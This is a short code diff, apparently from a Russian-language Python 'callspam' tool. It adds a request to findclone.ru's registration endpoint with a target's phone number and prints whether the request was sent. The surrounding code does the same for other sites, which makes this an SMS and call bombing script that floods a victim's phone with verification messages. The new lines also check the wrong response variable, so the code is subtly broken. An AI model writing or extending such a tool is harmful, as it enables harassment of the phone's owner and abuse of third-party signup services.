@@ -167,7 +167,11 @@ class callspam:
 				print(Fore.GREEN + '9911030.ru: отправлено')
 			else:
 				print(Fore.RED + '9911030.ru: не отправлено')
-
+			findclone = requests.get('https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
+			if ur9911030.status_code == 200:
+				print(Fore.GREEN + 'findclone.ru: отправлено')
+			else:
+				print(Fore.RED + 'findclone.ru: не отправлено')
 			print('Готово!')
 			print(Style.RESET_ALL)
 spammer = callspam()
